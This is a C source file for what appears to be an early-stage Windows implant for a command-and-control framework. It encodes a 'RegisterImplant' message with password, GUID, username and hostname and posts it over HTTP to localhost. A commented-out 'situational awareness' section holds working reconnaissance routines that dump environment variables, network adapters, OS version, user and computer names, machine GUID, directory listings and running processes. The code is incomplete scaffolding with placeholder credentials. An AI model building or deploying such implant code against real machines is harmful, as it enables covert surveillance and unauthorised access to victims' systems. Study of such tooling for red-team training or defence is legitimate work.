#define PB_ENABLE_MALLOC 1
#include "debug.h"

#include <windows.h>

#include "execute.h"
#include "httpclient.h"
#include <stdio.h>
#include <string.h>
#include <iphlpapi.h>

#include <pb_encode.h>
#include <pb_decode.h>
#include "implant.pb.h"

// #include <sstream>

**/
void test_pb() {
  RegisterImplant registerMessage = RegisterImplant_init_zero;
  registerMessage.Password = "myPassword";
  registerMessage.GUID = "1234-5678-ABCD";
  registerMessage.Username = "user1";
  registerMessage.Hostname = "host.local";

  //  size_t out = 0;
  /* This is the buffer where we will store our message. */
  uint8_t buffer[4096];
  pb_ostream_t stream = pb_ostream_from_buffer(buffer, sizeof(buffer));

  bool status = pb_encode(&stream, RegisterImplant_fields, &registerMessage);
  if (!status) {
    printf("Encoding failed: %s\n", PB_GET_ERROR(&stream));
  } // Adjust size as needed
  printf("wrote %llu\n", stream.bytes_written);
  // Decoding done, `registerMessage2` is now populated.

// Write data with WinHttpWriteData
  size_t out_size = 0;
  LPBYTE result = HTTPRequest(L"POST", L"localhost", L"/testpb", 5000, L"test",
                              buffer, stream.bytes_written, &out_size, FALSE);
  printf("%s\n", result);
  if (out_size > 0) {
    free(result);
  }
  pb_istream_t istream = pb_istream_from_buffer(buffer, stream.bytes_written);
  RegisterImplant registerMessage2 = RegisterImplant_init_zero;
  status = pb_decode(&istream, RegisterImplant_fields, &registerMessage2);
  if (!status) {
    printf("Decoding failed: %s\n", PB_GET_ERROR(&istream));
    return;
  }
  printf("Decoded Password: %s\n", (char *)registerMessage2.Password);
  printf("Decoded GUID: %s\n", (char *)registerMessage2.GUID);
  printf("Decoded Username: %s\n", (char *)registerMessage2.Username);
  printf("Decoded Hostname: %s\n", (char *)registerMessage2.Hostname);
  pb_release(RegisterImplant_fields, &registerMessage2);
  printf("Done!\n");
}

RegisterImplant birth_myself() {
	RegisterImplant ri = RegisterImplant_init_zero;
	ri.Password = "password";
	ri.GUID = "1234-5678-ABCD";
	ri.Username = "username";
	ri.Hostname = "hostname";
	return ri;
}

int main() {
	RegisterImplant ri = birth_myself();
	printf("%s", ri.Password);
	test_pb();
	return 0; // Return 0 for success
}


/**
//SITUATIONAL AWARENESS

// Function to gather and print environment variables

//read environment variables
void getEnvironmentVariables() {
    // Pointer to hold the environment variables
    LPTSTR lpEnvironment = GetEnvironmentStrings();
    if (lpEnvironment == NULL) {
        printf("Failed to retrieve environment variables\n");
        return;
    }

    // Iterate over each environment variable
    LPTSTR lpszVariable = lpEnvironment;
    while (*lpszVariable != TEXT('\0')) {
        // Find the end of the variable name and the beginning of its value
        LPTSTR lpszEqualSign = _tcschr(lpszVariable, TEXT('='));
        if (lpszEqualSign != NULL) {
            // Copy the variable name
            TCHAR variable[MAX_PATH];
            int length = lpszEqualSign - lpszVariable;
            _tcsncpy_s(variable, MAX_PATH, lpszVariable, length);
            variable[length] = TEXT('\0');

            // Print the variable name and value
            _tprintf(TEXT("%s: %s\n"), variable, lpszEqualSign + 1);
        }

        // Move to the next environment variable
        lpszVariable += lstrlen(lpszVariable) + 1;
    }

    // Free the environment block
    FreeEnvironmentStrings(lpEnvironment);
}


// Function to gather and print network interfaces
void getNetworkInterfaces() {
    // Variable to store the result of the GetAdaptersAddresses function
    ULONG result = 0;

    // Variable to hold the buffer size needed for the adapter information
    ULONG buffer_size = 0;

    // Call GetAdaptersAddresses with a NULL buffer to get the required buffer size
    result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &buffer_size);
    if (result != ERROR_BUFFER_OVERFLOW) {
        printf("Error getting buffer size for adapter information\n");
        return;
    }

    // Allocate memory for the adapter information buffer
    IP_ADAPTER_ADDRESSES *adapter_addresses = (IP_ADAPTER_ADDRESSES *)malloc(buffer_size);
    if (adapter_addresses == NULL) {
        printf("Memory allocation failed for adapter information\n");
        return;
    }

    // Call GetAdaptersAddresses again to retrieve the adapter information
    result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, adapter_addresses, &buffer_size);
    if (result != NO_ERROR) {
        printf("Error getting adapter information\n");
        free(adapter_addresses);
        return;
    }

    // Iterate over the adapter information and print relevant details
    for (IP_ADAPTER_ADDRESSES *adapter = adapter_addresses; adapter != NULL; adapter = adapter->Next) {
        printf("Adapter Name: %ws\n", adapter->AdapterName);
        printf("Description: %ws\n", adapter->Description);
        printf("IPv4 Address: ");
        if (adapter->FirstUnicastAddress != NULL && adapter->FirstUnicastAddress->Address.lpSockaddr != NULL) {
            printf("%s\n", inet_ntoa(((struct sockaddr_in *)adapter->FirstUnicastAddress->Address.lpSockaddr)->sin_addr));
        } else {
            printf("None\n");
        }
        printf("IPv6 Address: ");
        if (adapter->FirstUnicastAddress != NULL && adapter->FirstUnicastAddress->Next != NULL) {
            printf("%s\n", inet_ntoa(((struct sockaddr_in *)adapter->FirstUnicastAddress->Next->Address.lpSockaddr)->sin_addr));
        } else {
            printf("None\n");
        }
        printf("\n");
    }

    // Free the memory allocated for the adapter information
    free(adapter_addresses);
}

//get the windows version 
void getSystemVersion() {
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    if (GetVersionEx((OSVERSIONINFO *)&osvi)) {
        printf("Operating System Version: %d.%d\n", osvi.dwMajorVersion, osvi.dwMinorVersion);
        printf("Build Number: %d\n", osvi.dwBuildNumber);
    } else {
        printf("Failed to retrieve system version information.\n");
    }
}

//to get the current user and token (is this getting the token??)
void getCurrentUser() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;

    if (GetUserName(username, &username_len)) {
        printf("Current User: %s\n", username);
    } else {
        printf("Failed to retrieve current user information.\n");
    }
}

// Function to get computer name
void getComputerName() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1]; 
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

    if (GetComputerName(computerName, &size)) {
        printf("Computer Name: %s\n", computerName);
    } else {
        printf("Failed to retrieve computer name.\n");
    }
}

//get machine GUID
void getMachineGUID() {
    HW_PROFILE_INFO hwProfileInfo;
    if (GetCurrentHwProfileA(&hwProfileInfo) != NULL) {
        printf("Machine GUID: %s\n", hwProfileInfo.szHwProfileGuid);
    } else {
        printf("Failed to retrieve machine GUID\n");
    }
}

// Function to list files in a directory
void listFilesInDirectory(const char *path) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;

    // Prepare the search path
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", path);

    // Find the first file in the directory
    hFind = FindFirstFile(searchPath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Error opening directory: %s\n", path);
        return;
    }

    // Iterate through all files in the directory
    do {
        // Skip directories
        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            printf("%s\n", findFileData.cFileName);
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    // Close the search handle
    FindClose(hFind);
}

//change current directory
bool ChangeDirectory(const char *path) {
    if (SetCurrentDirectory(path)) {
        return true; // Directory change successful
    } else {
        return false; // Directory change failed
    }
}

// Function to enumerate and print running processes
void listRunningProcesses() {
    DWORD count;
    PWTS_PROCESS_INFOA pProcessInfo;

    // Get the list of processes on the terminal server
    if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pProcessInfo, &count)) {
        printf("Failed to enumerate processes on terminal server\n");
        return;
    }

    // Iterate through the processes and print information
    for (DWORD i = 0; i < count; i++) {
        printf("Process ID: %d, Session ID: %d, Process Name: %s\n",
               pProcessInfo[i].ProcessId, pProcessInfo[i].SessionId, pProcessInfo[i].pProcessName);
    }

    // Free the memory allocated for the process information
    WTSFreeMemory(pProcessInfo);
}
